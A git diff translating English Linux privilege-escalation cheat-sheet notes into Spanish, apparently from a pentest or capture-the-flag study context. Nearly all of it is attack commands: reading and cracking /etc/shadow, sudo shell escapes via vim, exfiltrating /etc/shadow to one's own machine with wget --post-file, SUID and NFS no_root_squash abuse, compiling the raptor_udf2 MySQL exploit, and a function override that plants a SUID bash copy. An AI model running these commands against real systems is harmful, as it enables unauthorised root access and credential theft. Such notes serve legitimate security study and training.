@@ -1,37 +1,35 @@
-System enumeration
+Enumeración del sistema
 > hostname 
-> uname -a //For listing the version of the Linux OS using to find if the version its vulnerable
+> uname -a //Lista todo la información del OS
 > cat /proc/version 
 	/etc/*release
 	/etc/lsb-release
 	/etc/redhat-release
 	
 > cat /etc/issue
-> ps aux // To list all the service are running on the device PD: you can see the user using pipping you can grep for the one which the root user it's actually 
-running
+> ps aux //Processos que esta corriendo actualmante 
 
 
- User Enumeration
+ Enumeración de usuarios
 > whoami
 > id 
 > sudo -l
 > cat /etc/passwd
-> cat /etc/shadow //password hased use JOHNN to  brute force it 
+> cat /etc/shadow 
 > cat /etc/group 
 
 
- Network Enumeration
+ Enumeración de las red
 > ifconfig
 > ip route 
 > arp -a
 > ip neigh
-> netsat //Win users and Linux OS users
-
+> netsat 
 
 Password Huting
->grep --color=auto -rnw '/' -ie 'PASSWORD' --color=always // Grep for files which contains PASSWORD word or password initication
+>grep --color=auto -rnw '/' -ie 'PASSWORD' --color=always // Grep todo los archivos que tenga la palabra PASSWORD
 
-Weak Files
+Archivos que con permisos debiles
 > cat /etc/passwd
 > cat /etc/shadow
 > unshadow passwd shadow
@@ -42,10 +40,10 @@ Weak Files
 Sudo
 > sudo -l to see all the files
     > vim : sudo vim -c '!sh'
-    > apache2 : sudo apache2 /etc/shadow to see unauthorized files
+    > apache2 : sudo apache2 /etc/shadow //para veer los archivos que no estes autorizados
     > wget : --post-file=/etc/shadow to your machine....
 ```
-More on GTFobins
+Mas en GTFobins
 ```
 
 Capabilities
@@ -55,8 +53,6 @@ Capabilities
 
 Crontab
 > normal path = cat /etc/crontab 
-> to see the process and use it to execute privilege escalation
-
 Wildcard
 
  create file for exploitation
@@ -71,11 +67,11 @@ Wildcard
 SUID
 
 > find / -perm -4000 -type f 2>/dev/null
-> find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null //FInd all SUID and SGID
+> find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null //Busca todo los SUID y GUID
 NFS
 
 >cat /etc/exports
->Track for no_root_squash files = the file is sharedable and mounteable
+>Track for no_root_squash files = El directorio se puede montar monturas
 >showmount -o <IP>
 > mkdir /tmp/mountme
 >mount -o rw.vers=2 <IP>:/tmp /tmp/mountme
@@ -84,7 +80,7 @@ NFS
 >chmod +x /tmp/mountme/x
 > And execute ./x
    
-Service Exploits   
+ Exploits de servios  
    
    > 	cd /home/user/tools/mysql-udf
    >	gcc -g -c raptor_udf2.c -fPIC
@@ -144,7 +140,7 @@ Shared Object Injection
 	// execute the suid
 	
 	
-		- If they are calling directly fron /usr/bin/X the service we have another way to do this
+		-Si llama desde /usr/bin/X tenemos otras vias de hacer esto
 		
 	function usr/sbin/service() {cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p;}	
 	
